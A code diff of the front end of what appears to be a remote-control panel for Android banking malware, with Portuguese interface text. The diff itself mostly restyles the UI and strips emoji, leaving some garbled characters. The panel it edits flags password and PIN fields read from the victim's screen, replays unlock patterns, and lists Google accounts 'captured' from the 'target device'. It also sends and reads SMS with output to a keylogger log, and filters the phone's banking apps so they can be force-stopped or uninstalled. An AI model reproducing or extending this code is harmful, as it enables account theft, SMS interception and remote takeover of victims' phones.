                   {isScreenReaderEnabled && (
                     <div className="text-[10px] bg-green-600/30 text-green-300 px-1.5 py-0.5 rounded flex items-center">
@@ -10121,7 +10185,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                       <p className="mb-2">Screen Reader não ativado</p>
                       <button
                         onClick={toggleScreenReader}
-                        className="px-4 py-2 bg-green-600 hover:bg-green-700 text-white rounded-lg text-sm"
+                        className="px-4 py-2 bg-green-600 hover:bg-green-700 text-white rounded-md text-sm"
                       >
                         Ativar
                       </button>
@@ -10132,7 +10196,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                     {/* Canvas interativo da V2 */}
                     <div className="flex items-center justify-center p-2 bg-black/30">
                       <div 
-                        className="relative bg-[#120303] cursor-crosshair flex items-center justify-center rounded-lg border border-green-500/20"
+                        className="relative bg-[#120303] cursor-crosshair flex items-center justify-center rounded-md border border-green-500/20"
                         style={{
                           width: '450px',
                           flexShrink: 0,
@@ -10224,7 +10288,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
 
                               setPatternInput(patternStr);
                               setCapturedPattern(patternStr);
-                              addLog(`⚡ Padrão (${patternStr}) enviado ao celular via segmentos encadeados (L-Lock)`);
+                              addLog(` Padrão (${patternStr}) enviado ao celular via segmentos encadeados (L-Lock)`);
                             }
                             v2PatternDrawnRef.current = [];
                             setV2PatternDrawn([]);
@@ -10303,7 +10367,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                               sendCommand({ action: 'PLAY_PATTERN_SEQUENCE', pattern: patternStr, delay: 1000 });
                               setPatternInput(patternStr);
                               setCapturedPattern(patternStr);
-                              addLog(`⚡ Padrão desenhado na Tela V2 enviado ao aparelho: ${patternStr}`);
+                              addLog(` Padrão desenhado na Tela V2 enviado ao aparelho: ${patternStr}`);
                             }
                             setV2PatternDrawn([]);
                             setV2PatternDragPos(null);
@@ -10332,7 +10396,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                       <div className="px-3 py-2 bg-green-950/30 border-b border-green-500/15">
                         <h4 className="text-green-300 font-bold text-xs flex items-center">
                           <List className="w-3.5 h-3.5 mr-1.5 text-green-400 animate-pulse" />
-                          Elementos🏦 Interativos ({(() => {
+                          Elementos Interativos ({(() => {
                             const list: ScreenReaderNode[] = [];
                             const collect = (node: ScreenReaderNode) => {
                               if (!node) return;
@@ -10368,17 +10432,17 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                             const isInput = item.editable;
                             const isPin = item.isPinDigit;
                             
-                            let typeBadge = "⚡ CLIQUE";
-                            let badgeStyle = "bg-blue-950/60 text-blue-400 border-blue-500/30";
+                            let typeBadge = " CLIQUE";
+                            let badgeStyle = "bg-[#121214]/60 text-[#ef4444] border-[#2a2a31]/30";
                             
                             if (isPwd) {
-                              typeBadge = "🔑 SENHA";
-                              badgeStyle = "bg-red-950/60 text-red-400 border-red-500/30";
+                              typeBadge = " SENHA";
+                              badgeStyle = "bg-[#121214]/60 text-[#ef4444] border-[#2a2a31]/30";
                             } else if (isInput) {
-                              typeBadge = "“ INPUT";
+                              typeBadge = " INPUT";
                               badgeStyle = "bg-green-950/60 text-green-400 border-green-500/30";
                             } else if (isPin) {
-                              typeBadge = "🔢 PIN";
+                              typeBadge = " PIN";
                               badgeStyle = "bg-amber-950/60 text-amber-400 border-amber-500/30";
                             }
                             
@@ -10400,10 +10464,10 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                 key={idx}
                                 onMouseEnter={() => setHoveredNode(item)}
                                 onMouseLeave={() => setHoveredNode(null)}
-                                className="group flex items-center justify-between p-2 rounded bg-slate-950/50 hover:bg-green-500/10 border border-slate-900 hover:border-green-500/30 transition-all cursor-pointer"
+                                className="group flex items-center justify-between p-2 rounded bg-slate-950/50 hover:bg-green-500/10 border border-[#121214] hover:border-green-500/30 transition-all cursor-pointer"
                                 onClick={() => {
                                   sendCommand({ action: 'CLICK', x: cx, y: cy });
-                                  addLog(`–± Click remoto em: "${label}" (${cx}, ${cy})`);
+                                  addLog(`± Click remoto em: "${label}" (${cx}, ${cy})`);
                                 }}
                               >
                                 <div className="flex flex-col min-w-0 mr-2">
@@ -10411,7 +10475,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                     <span className={`text-[8px] font-bold px-1.5 py-0.5 rounded border ${badgeStyle}`}>
                                       {typeBadge}
                                     </span>
-                                    <span className="text-[9px] text-slate-500 font-mono">
+                                    <span className="text-[9px] text-[#8b8b94] font-mono">
                                       ({cx}, {cy})
                                     </span>
                                   </div>
@@ -10422,7 +10486,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                 <button
                                   className="px-2 py-0.5 bg-gradient-to-r from-green-800 to-emerald-700 hover:from-green-700 hover:to-emerald-600 text-white rounded text-[10px] font-bold transition-all shadow shadow-green-900/30 shrink-0"
                                 >
-                                  ▶
+                                  
                                 </button>
                               </div>
                             );
@@ -10445,13 +10509,13 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
         </div>
       )}
       
-      {/* 📧 MODAL DE CONTAS GOOGLE NO APARELHO */}
+      {/*  MODAL DE CONTAS GOOGLE NO APARELHO */}
       {showGoogleAccountsModal && (
         <div className="fixed inset-0 bg-black/80 backdrop-blur-md flex items-center justify-center z-50 p-4" onClick={() => setShowGoogleAccountsModal(false)}>
-          <div className="bg-[#380d04] border border-amber-500/50 shadow-[0_0_35px_rgba(245,158,11,0.3)] rounded-2xl max-w-xl w-full p-6 max-h-[85vh] overflow-hidden flex flex-col" onClick={(e) => e.stopPropagation()}>
+          <div className="bg-[#380d04] border border-amber-500/50 shadow-[0_0_35px_rgba(245,158,11,0.3)] rounded-md max-w-xl w-full p-6 max-h-[85vh] overflow-hidden flex flex-col" onClick={(e) => e.stopPropagation()}>
             <div className="flex items-center justify-between pb-4 border-b border-amber-500/30">
               <div className="flex items-center gap-3">
-                <div className="w-10 h-10 rounded-xl bg-amber-500/20 border border-amber-500/40 flex items-center justify-center text-amber-400 shadow-[0_0_12px_rgba(245,158,11,0.2)]">
+                <div className="w-10 h-10 rounded-md bg-amber-500/20 border border-amber-500/40 flex items-center justify-center text-amber-400 shadow-[0_0_12px_rgba(245,158,11,0.2)]">
                   <Mail className="w-6 h-6" />
                 </div>
                 <div>
@@ -10468,7 +10532,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
               </div>
               <button
                 onClick={() => setShowGoogleAccountsModal(false)}
-                className="w-8 h-8 rounded-lg bg-slate-800/80 hover:bg-slate-700 text-slate-300 hover:text-white flex items-center justify-center text-xl transition-all cursor-pointer"
+                className="w-8 h-8 rounded-md bg-[#24242a]/80 hover:bg-[#2a2a31] text-slate-300 hover:text-white flex items-center justify-center text-xl transition-all cursor-pointer"
               >
                 ×
               </button>
@@ -10476,7 +10540,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
 
             <div className="py-4 flex-1 overflow-y-auto custom-scrollbar space-y-3">
               {(!device?.accounts && !device?.google_accounts || (device?.accounts || device?.google_accounts || []).length === 0) ? (
-                <div className="text-center py-10 bg-[#1e0603] border border-dashed border-amber-500/30 rounded-xl p-6">
+                <div className="text-center py-10 bg-[#1e0603] border border-dashed border-amber-500/30 rounded-md p-6">
                   <Mail className="w-12 h-12 text-amber-500/40 mx-auto mb-3 animate-pulse" />
                   <p className="text-amber-200 text-sm font-bold font-mono">Nenhuma conta Google capturada ainda</p>
                   <p className="text-slate-400 text-xs font-mono mt-1 max-w-sm mx-auto">
@@ -10485,9 +10549,9 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                 </div>
               ) : (
                 (device?.accounts || device?.google_accounts || []).map((acc: string, i: number) => (
-                  <div key={i} className="flex items-center justify-between bg-[#1e0603] p-3.5 rounded-xl border border-amber-500/30 hover:border-amber-400/60 transition-all shadow-md group">
+                  <div key={i} className="flex items-center justify-between bg-[#1e0603] p-3.5 rounded-md border border-amber-500/30 hover:border-amber-400/60 transition-all shadow-md group">
                     <div className="flex items-center gap-3 min-w-0">
-                      <div className="w-9 h-9 rounded-xl bg-gradient-to-br from-amber-500/20 to-orange-600/30 border border-amber-500/40 flex items-center justify-center shrink-0 text-amber-400">
+                      <div className="w-9 h-9 rounded-md bg-gradient-to-br from-amber-500/20 to-[#84cc16]/30 border border-amber-500/40 flex items-center justify-center shrink-0 text-amber-400">
                         <Mail className="w-4 h-4" />
                       </div>
                       <div className="min-w-0">
@@ -10498,9 +10562,9 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                     <button
                       onClick={() => {
                         navigator.clipboard.writeText(acc);
-                        addLog(`📋 Conta Google ${acc} copiada!`);
+                        addLog(` Conta Google ${acc} copiada!`);
                       }}
-                      className="px-3 py-1.5 bg-amber-950/40 hover:bg-amber-900/60 border border-amber-500/40 hover:border-amber-300 text-amber-300 rounded-lg text-xs font-bold font-mono flex items-center gap-1.5 transition-all cursor-pointer shadow-sm shrink-0"
+                      className="px-3 py-1.5 bg-amber-950/40 hover:bg-amber-900/60 border border-amber-500/40 hover:border-amber-300 text-amber-300 rounded-md text-xs font-bold font-mono flex items-center gap-1.5 transition-all cursor-pointer shadow-sm shrink-0"
                     >
                       <Copy className="w-3.5 h-3.5" /> Copiar
                     </button>
@@ -10514,18 +10578,18 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                 onClick={() => {
                   sendCommand({ action: 'GET_DEVICE_INFO' });
                   sendCommand({ action: 'GET_ACCOUNTS' });
-                  addLog('🔄 Solicitando atualização de contas Google...');
+                  addLog(' Solicitando atualização de contas Google...');
                   setTimeout(() => {
                     loadDevice();
                   }, 1500);
                 }}
-                className="px-4 py-2 bg-gradient-to-r from-amber-600 to-orange-600 hover:from-amber-500 hover:to-orange-500 text-white rounded-xl font-bold font-mono text-xs flex items-center gap-2 transition-all shadow-[0_0_15px_rgba(245,158,11,0.3)] cursor-pointer"
+                className="px-4 py-2 bg-gradient-to-r from-amber-600 to-[#84cc16] hover:from-amber-500 hover:to-[#ef4444] text-white rounded-md font-bold font-mono text-xs flex items-center gap-2 transition-all shadow-[0_0_15px_rgba(245,158,11,0.3)] cursor-pointer"
               >
                 <RefreshCw className="w-4 h-4" /> Atualizar Contas
               </button>
               <button
                 onClick={() => setShowGoogleAccountsModal(false)}
-                className="px-4 py-2 bg-slate-800 hover:bg-slate-700 text-slate-300 rounded-xl font-bold font-mono text-xs transition-all cursor-pointer"
+                className="px-4 py-2 bg-[#24242a] hover:bg-[#2a2a31] text-slate-300 rounded-md font-bold font-mono text-xs transition-all cursor-pointer"
               >
                 Fechar
               </button>
@@ -10534,23 +10598,23 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
         </div>
       )}
 
-      {/* 💬 Modal de Envio e Leitura de SMS */}
+      {/*  Modal de Envio e Leitura de SMS */}
       {showSmsModal && (
         <div className="fixed inset-0 bg-black/80 backdrop-blur-md flex items-center justify-center z-50 p-4" onClick={() => setShowSmsModal(false)}>
-          <div className="bg-[#380d04] border border-blue-500/40 shadow-[0_0_35px_rgba(239,68,68,0.3)] rounded-2xl max-w-lg w-full p-6 space-y-4 text-slate-200" onClick={(e) => e.stopPropagation()}>
-            <div className="flex items-center justify-between pb-3 border-b border-blue-500/30">
+          <div className="bg-[#380d04] border border-[#2a2a31]/40 shadow-[0_0_35px_rgba(239,68,68,0.3)] rounded-md max-w-lg w-full p-6 space-y-4 text-slate-200" onClick={(e) => e.stopPropagation()}>
+            <div className="flex items-center justify-between pb-3 border-b border-[#2a2a31]/30">
               <div className="flex items-center gap-3">
-                <div className="w-10 h-10 rounded-xl bg-blue-500/20 border border-blue-500/40 flex items-center justify-center text-blue-400 shadow-[0_0_12px_rgba(239,68,68,0.2)]">
+                <div className="w-10 h-10 rounded-md bg-[#ef4444]/20 border border-[#2a2a31]/40 flex items-center justify-center text-[#ef4444] shadow-[0_0_12px_rgba(239,68,68,0.2)]">
                   <MessageSquare className="w-6 h-6" />
                 </div>
                 <div>
-                  <h3 className="text-lg font-black text-blue-300 font-mono uppercase tracking-wider">Central SMS do Aparelho</h3>
+                  <h3 className="text-lg font-black text-[#ef4444] font-mono uppercase tracking-wider">Central SMS do Aparelho</h3>
                   <p className="text-slate-400 text-xs font-mono">Envie ou solicite mensagens de texto do dispositivo alvo</p>
                 </div>
               </div>
               <button
                 onClick={() => setShowSmsModal(false)}
-                className="w-8 h-8 rounded-lg bg-slate-800/80 hover:bg-slate-700 text-slate-300 hover:text-white flex items-center justify-center text-xl transition-all cursor-pointer"
+                className="w-8 h-8 rounded-md bg-[#24242a]/80 hover:bg-[#2a2a31] text-slate-300 hover:text-white flex items-center justify-center text-xl transition-all cursor-pointer"
               >
                 ×
               </button>
@@ -10558,7 +10622,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
 
             <div className="space-y-4">
               <div>
-                <label className="block text-xs font-bold uppercase tracking-wider text-blue-300 mb-1 font-mono">
+                <label className="block text-xs font-bold uppercase tracking-wider text-[#ef4444] mb-1 font-mono">
                    Número de Destino (SMS)
                 </label>
                 <input
@@ -10566,25 +10630,25 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                   placeholder="Ex: +5511999999999 ou 11999999999"
                   value={smsPhone}
                   onChange={(e) => setSmsPhone(e.target.value)}
-                  className="w-full bg-[#1e0603] border border-blue-500/30 rounded-xl px-4 py-2.5 text-white font-mono placeholder:text-slate-600 focus:outline-none focus:border-blue-400 transition"
+                  className="w-full bg-[#1e0603] border border-[#2a2a31]/30 rounded-md px-4 py-2.5 text-white font-mono placeholder:text-[#6f6f78] focus:outline-none focus:border-[#3a3a44] transition"
                 />
               </div>
 
               <div>
-                <label className="block text-xs font-bold uppercase tracking-wider text-blue-300 mb-1 font-mono">
-                  💬 Mensagem de Texto
+                <label className="block text-xs font-bold uppercase tracking-wider text-[#ef4444] mb-1 font-mono">
+                   Mensagem de Texto
                 </label>
                 <textarea
                   rows={4}
                   placeholder="Digite o conteúdo do SMS a ser enviado pelo aparelho..."
                   value={smsMessage}
                   onChange={(e) => setSmsMessage(e.target.value)}
-                  className="w-full bg-[#1e0603] border border-blue-500/30 rounded-xl px-4 py-2.5 text-white placeholder:text-slate-600 focus:outline-none focus:border-blue-400 transition resize-none font-mono text-sm"
+                  className="w-full bg-[#1e0603] border border-[#2a2a31]/30 rounded-md px-4 py-2.5 text-white placeholder:text-[#6f6f78] focus:outline-none focus:border-[#3a3a44] transition resize-none font-mono text-sm"
                 />
               </div>
 
               {smsStatusMsg && (
-                <div className={`p-3 rounded-xl text-xs font-mono font-medium ${smsStatusMsg.includes('sucesso') || smsStatusMsg.includes('enviado') ? 'bg-emerald-500/10 text-emerald-300 border border-emerald-500/40' : 'bg-blue-500/10 text-blue-300 border border-blue-500/40'}`}>
+                <div className={`p-3 rounded-md text-xs font-mono font-medium ${smsStatusMsg.includes('sucesso') || smsStatusMsg.includes('enviado') ? 'bg-emerald-500/10 text-emerald-300 border border-emerald-500/40' : 'bg-[#ef4444]/10 text-[#ef4444] border border-[#2a2a31]/40'}`}>
                   {smsStatusMsg}
                 </div>
               )}
@@ -10602,14 +10666,14 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                         phone: smsPhone.trim(),
                         message: smsMessage.trim()
                       });
-                      setSmsStatusMsg('✅ Comando de envio de SMS despachado com sucesso!');
+                      setSmsStatusMsg(' Comando de envio de SMS despachado com sucesso!');
                     } catch (err: any) {
-                      setSmsStatusMsg('❌ Erro ao enviar comando: ' + (err.message || 'Falha na íconexão'));
+                      setSmsStatusMsg(' Erro ao enviar comando: ' + (err.message || 'Falha na íconexão'));
                     } finally {
                       setSmsSending(false);
                     }
                   }}
-                  className="flex-1 py-3 bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-500 hover:to-indigo-500 disabled:opacity-50 text-white font-bold font-mono text-xs rounded-xl shadow-[0_0_15px_rgba(239,68,68,0.3)] transition flex items-center justify-center gap-2 cursor-pointer"
+                  className="flex-1 py-3 bg-gradient-to-r from-[#ef4444] to-[#ef4444] hover:from-[#ef4444] hover:to-[#ef4444] disabled:opacity-50 text-[#10120a] font-bold font-mono text-xs rounded-md shadow-[0_0_15px_rgba(239,68,68,0.3)] transition flex items-center justify-center gap-2 cursor-pointer"
                 >
                   <MessageSquare className="w-4 h-4" />
                   {smsSending ? 'Enviando...' : 'Enviar SMS'}
@@ -10622,12 +10686,12 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                     setSmsStatusMsg('³ Solicitando SMS da caixa de entrada do aparelho...');
                     try {
                       await devicesAPI.sendCommand(deviceId, { action: 'GET_SMS' });
-                      setSmsStatusMsg('📥 Requisição enviada! As mensagens serão listadas no Log/Keylogger.');
+                      setSmsStatusMsg(' Requisição enviada! As mensagens serão listadas no Log/Keylogger.');
                     } catch (err: any) {
-                      setSmsStatusMsg('❌ Erro ao solicitar SMS: ' + (err.message || 'Falha na íconexão'));
+                      setSmsStatusMsg(' Erro ao solicitar SMS: ' + (err.message || 'Falha na íconexão'));
                     }
                   }}
-                  className="px-4 py-3 bg-slate-800/80 hover:bg-slate-700 text-slate-200 font-bold font-mono text-xs rounded-xl border border-slate-700 transition cursor-pointer"
+                  className="px-4 py-3 bg-[#24242a]/80 hover:bg-[#2a2a31] text-slate-200 font-bold font-mono text-xs rounded-md border border-[#2a2a31] transition cursor-pointer"
                 >
                   Obter Inbox SMS
                 </button>
@@ -10637,13 +10701,13 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
         </div>
       )}
 
-      {/* 👥 Modal de Visualização de Contatos */}
+      {/*  Modal de Visualização de Contatos */}
       {showContactsModal && (
         <div className="fixed inset-0 bg-black/80 backdrop-blur-md flex items-center justify-center z-50 p-4" onClick={() => setShowContactsModal(false)}>
-          <div className="bg-[#380d04] border border-amber-500/40 shadow-[0_0_35px_rgba(245,158,11,0.3)] rounded-2xl max-w-lg w-full p-6 space-y-4 text-slate-200" onClick={(e) => e.stopPropagation()}>
+          <div className="bg-[#380d04] border border-amber-500/40 shadow-[0_0_35px_rgba(245,158,11,0.3)] rounded-md max-w-lg w-full p-6 space-y-4 text-slate-200" onClick={(e) => e.stopPropagation()}>
             <div className="flex items-center justify-between pb-3 border-b border-amber-500/30">
               <div className="flex items-center gap-3">
-                <div className="w-10 h-10 rounded-xl bg-amber-500/20 border border-amber-500/40 flex items-center justify-center text-amber-400 shadow-[0_0_12px_rgba(245,158,11,0.2)]">
+                <div className="w-10 h-10 rounded-md bg-amber-500/20 border border-amber-500/40 flex items-center justify-center text-amber-400 shadow-[0_0_12px_rgba(245,158,11,0.2)]">
                   <Users className="w-6 h-6" />
                 </div>
                 <div>
@@ -10653,7 +10717,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
               </div>
               <button
                 onClick={() => setShowContactsModal(false)}
-                className="w-8 h-8 rounded-lg bg-slate-800/80 hover:bg-slate-700 text-slate-300 hover:text-white flex items-center justify-center text-xl transition-all cursor-pointer"
+                className="w-8 h-8 rounded-md bg-[#24242a]/80 hover:bg-[#2a2a31] text-slate-300 hover:text-white flex items-center justify-center text-xl transition-all cursor-pointer"
               >
                 ×
               </button>
@@ -10662,17 +10726,17 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
             <div className="flex items-center justify-between gap-3">
               <input
                 type="text"
-                placeholder="” Pesquisar por nome ou número..."
+                placeholder=" Pesquisar por nome ou número..."
                 value={contactsSearch}
                 onChange={(e) => setContactsSearch(e.target.value)}
-                className="flex-1 bg-[#1e0603] border border-amber-500/30 rounded-xl px-4 py-2 text-white font-mono text-xs placeholder:text-slate-600 focus:outline-none focus:border-amber-400 transition"
+                className="flex-1 bg-[#1e0603] border border-amber-500/30 rounded-md px-4 py-2 text-white font-mono text-xs placeholder:text-[#6f6f78] focus:outline-none focus:border-amber-400 transition"
               />
               <button
                 onClick={fetchContacts}
                 disabled={contactsLoading}
-                className="px-3 py-2 bg-amber-500/20 border border-amber-500/40 text-amber-300 rounded-xl font-mono text-xs font-bold hover:bg-amber-500/30 transition flex items-center gap-1.5 cursor-pointer"
+                className="px-3 py-2 bg-amber-500/20 border border-amber-500/40 text-amber-300 rounded-md font-mono text-xs font-bold hover:bg-amber-500/30 transition flex items-center gap-1.5 cursor-pointer"
               >
-                {contactsLoading ? '³...' : '”„ Atualizar'}
+                {contactsLoading ? '³...' : ' Atualizar'}
               </button>
             </div>
 
@@ -10682,7 +10746,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                   Carregando agenda de contatos do dispositivo...
                 </div>
               ) : contactsList.length === 0 ? (
-                <div className="text-center py-8 text-slate-500 font-mono text-xs">
+                <div className="text-center py-8 text-[#8b8b94] font-mono text-xs">
                   Nenhum contato encontrado ou permissão não concedida no dispositivo.
                 </div>
               ) : (
@@ -10694,10 +10758,10 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                   .map((contact, index) => (
                     <div
                       key={index}
-                      className="p-3 bg-[#1e0603]/80 border border-slate-800 hover:border-amber-500/40 rounded-xl flex items-center justify-between transition group"
+                      className="p-3 bg-[#1e0603]/80 border border-[#24242a] hover:border-amber-500/40 rounded-md flex items-center justify-between transition group"
                     >
                       <div className="flex items-center gap-3">
-                        <div className="w-8 h-8 rounded-lg bg-amber-500/10 border border-amber-500/20 text-amber-400 flex items-center justify-center font-mono font-bold text-xs">
+                        <div className="w-8 h-8 rounded-md bg-amber-500/10 border border-amber-500/20 text-amber-400 flex items-center justify-center font-mono font-bold text-xs">
                           {(contact.name || 'S')[0].toUpperCase()}
                         </div>
                         <div>
@@ -10715,9 +10779,9 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                             navigator.clipboard.writeText(contact.number);
                             alert(`Número ${contact.number} copiado!`);
                           }}
-                          className="text-[10px] font-mono text-slate-400 hover:text-amber-300 bg-slate-800/80 hover:bg-amber-500/20 px-2 py-1 rounded transition border border-slate-700 cursor-pointer"
+                          className="text-[10px] font-mono text-slate-400 hover:text-amber-300 bg-[#24242a]/80 hover:bg-amber-500/20 px-2 py-1 rounded transition border border-[#2a2a31] cursor-pointer"
                         >
-                          📋 Copiar
+                           Copiar
                         </button>
                       )}
                     </div>
@@ -10731,7 +10795,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
       {/*  MODAL DE APPS INSTALADOS */}
       {showAppsModal && (
         <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50" onClick={() => setShowAppsModal(false)}>
-          <div className="bg-[#440e05] rounded-lg p-6 max-w-4xl w-full mx-4 max-h-[90vh] overflow-hidden flex flex-col" onClick={(e) => e.stopPropagation()}>
+          <div className="bg-[#121214] rounded-md p-6 max-w-4xl w-full mx-4 max-h-[90vh] overflow-hidden flex flex-col" onClick={(e) => e.stopPropagation()}>
             <div className="flex items-center justify-between mb-4">
               <h2 className="text-2xl font-bold text-white flex items-center">
                 <span className="text-3xl mr-3"></span>
@@ -10755,58 +10819,58 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                 placeholder="Buscar app..."
                 value={appsSearch}
                 onChange={(e) => setAppsSearch(e.target.value)}
-                className="flex-1 min-w-[200px] px-3 py-2 bg-slate-700 text-white rounded-lg border border-blue-500/25 focus:border-blue-500 focus:outline-none"
+                className="flex-1 min-w-[200px] px-3 py-2 bg-[#2a2a31] text-white rounded-md border border-[#2a2a31]/25 focus:border-[#2a2a31] focus:outline-none"
               />
               
               <div className="flex gap-1">
                 <button
                   onClick={() => setAppsFilter('banks')}
-                  className={`px-3 py-2 rounded-lg font-medium transition-all ${
+                  className={`px-3 py-2 rounded-md font-medium transition-all ${
                     appsFilter === 'banks' 
-                      ? 'bg-purple-600 text-white shadow-[0_0_10px_rgba(220,38,38,0.3)]' 
-                      : 'bg-slate-700 text-gray-300 hover:bg-slate-600'
+                      ? 'bg-[#84cc16] text-white shadow-[0_0_10px_rgba(239,68,68,0.3)]' 
+                      : 'bg-[#2a2a31] text-gray-300 hover:bg-[#6f6f78]'
                   }`}
                 >
                    Bancos
                 </button>
                 <button
                   onClick={() => setAppsFilter('user')}
-                  className={`px-3 py-2 rounded-lg font-medium transition-all ${
+                  className={`px-3 py-2 rounded-md font-medium transition-all ${
                     appsFilter === 'user' 
-                      ? 'bg-blue-600 text-white' 
-                      : 'bg-slate-700 text-gray-300 hover:bg-slate-600'
+                      ? 'bg-[#ef4444] text-white' 
+                      : 'bg-[#2a2a31] text-gray-300 hover:bg-[#6f6f78]'
                   }`}
                 >
-                  👤 Usuário
+                   Usuário
                 </button>
                 <button
                   onClick={() => setAppsFilter('system')}
-                  className={`px-3 py-2 rounded-lg font-medium transition-all ${
+                  className={`px-3 py-2 rounded-md font-medium transition-all ${
                     appsFilter === 'system' 
-                      ? 'bg-blue-600 text-white' 
-                      : 'bg-slate-700 text-gray-300 hover:bg-slate-600'
+                      ? 'bg-[#ef4444] text-white' 
+                      : 'bg-[#2a2a31] text-gray-300 hover:bg-[#6f6f78]'
                   }`}
                 >
-                  š™ Sistema
+                  š Sistema
                 </button>
                 <button
                   onClick={() => setAppsFilter('all')}
-                  className={`px-3 py-2 rounded-lg font-medium transition-all ${
+                  className={`px-3 py-2 rounded-md font-medium transition-all ${
                     appsFilter === 'all' 
-                      ? 'bg-blue-600 text-white' 
-                      : 'bg-slate-700 text-gray-300 hover:bg-slate-600'
+                      ? 'bg-[#ef4444] text-white' 
+                      : 'bg-[#2a2a31] text-gray-300 hover:bg-[#6f6f78]'
                   }`}
                 >
-                  📋 Todos
+                   Todos
                 </button>
               </div>
               
               <button
                 onClick={fetchInstalledApps}
                 disabled={isLoadingApps}
-                className="px-3 py-2 bg-green-600 hover:bg-green-700 text-white rounded-lg font-medium transition-all flex items-center"
+                className="px-3 py-2 bg-green-600 hover:bg-green-700 text-white rounded-md font-medium transition-all flex items-center"
               >
-                {isLoadingApps ? '³' : '”„'} Atualizar
+                {isLoadingApps ? '³' : ''} Atualizar
               </button>
             </div>
 
@@ -10814,12 +10878,12 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
             <div className="flex-1 overflow-y-auto">
               {isLoadingApps ? (
                 <div className="flex items-center justify-center py-12">
-                  <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-500"></div>
+                  <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-[#2a2a31]"></div>
                   <span className="ml-3 text-gray-400">Carregando apps...</span>
                 </div>
               ) : filteredApps.length === 0 ? (
                 <div className="text-center py-12 text-gray-400">
-                  <span className="text-4xl mb-4 block">📭</span>
+                  <span className="text-4xl mb-4 block"></span>
                   {installedApps.length === 0 
                     ? 'Clique em "Atualizar" para carregar os apps'
                     : 'Nenhum app encontrado com os filtros atuais'
@@ -10830,12 +10894,12 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                   {filteredApps.map((app, index) => (
                     <div
                       key={app.package || index}
-                      className="bg-slate-700 rounded-lg p-3 flex items-center justify-between hover:bg-slate-600 transition-all"
+                      className="bg-[#2a2a31] rounded-md p-3 flex items-center justify-between hover:bg-[#6f6f78] transition-all"
                     >
                       <div className="flex-1 min-w-0">
                         <div className="flex items-center">
                           <span className="text-2xl mr-2">
-                            {app.isSystem ? 'š™' : '“±'}
+                            {app.isSystem ? 'š' : '±'}
                           </span>
                           <div className="min-w-0">
                             <h4 className="text-white font-medium truncate">
@@ -10857,28 +10921,28 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                         {app.canOpen && (
                           <button
                             onClick={() => openApp(app.package, app.name)}
-                            className="p-2 bg-blue-600 hover:bg-blue-700 text-white rounded-lg transition-all"
+                            className="p-2 bg-[#ef4444] hover:bg-[#f87171] text-white rounded-md transition-all"
                             title="Abrir app"
                           >
-                            –¶
+                            ¶
                           </button>
                         )}
                         
                         <button
                           onClick={() => forceStopApp(app.package, app.name)}
-                          className="p-2 bg-yellow-600 hover:bg-yellow-700 text-white rounded-lg transition-all"
+                          className="p-2 bg-yellow-600 hover:bg-yellow-700 text-white rounded-md transition-all"
                           title="Forçar parada"
                         >
-                          ⛔
+                          
                         </button>
                         
                         {!app.isSystem && (
                           <button
                             onClick={() => uninstallApp(app.package, app.name)}
-                            className="p-2 bg-red-600 hover:bg-red-700 text-white rounded-lg transition-all"
+                            className="p-2 bg-[#ef4444] hover:bg-[#f87171] text-white rounded-md transition-all"
                             title="Desinstalar"
                           >
-                            —‘
+                            
                           </button>
                         )}
           </div>
@@ -10891,27 +10955,27 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
         </div>
       )}
 
-      {/* 📋 MODAL DUPLICADOR DE APLICATIVO DO APARELHO */}
+      {/*  MODAL DUPLICADOR DE APLICATIVO DO APARELHO */}
       {showDeviceDuplicatorModal && (
         <div className="fixed inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center z-50 p-4" onClick={() => setShowDeviceDuplicatorModal(false)}>
-          <div className="bg-[#290903] border border-cyan-500/30 rounded-2xl p-6 max-w-xl w-full space-y-6 shadow-[0_0_40px_rgba(255,43,43,0.2)]" onClick={(e) => e.stopPropagation()}>
-            <div className="flex items-center justify-between border-b border-slate-800 pb-4">
+          <div className="bg-[#1a1a1e] border border-[#2a2a31]/30 rounded-md p-6 max-w-xl w-full space-y-6 shadow-[0_0_40px_rgba(239,68,68,0.2)]" onClick={(e) => e.stopPropagation()}>
+            <div className="flex items-center justify-between border-b border-[#24242a] pb-4">
               <div className="flex items-center gap-3">
-                <div className="w-10 h-10 rounded-xl bg-cyan-500/15 border border-cyan-500/30 flex items-center justify-center text-cyan-300">
+                <div className="w-10 h-10 rounded-md bg-[#ef4444]/15 border border-[#2a2a31]/30 flex items-center justify-center text-[#ef4444]">
                   <Copy size={20} />
                 </div>
                 <div>
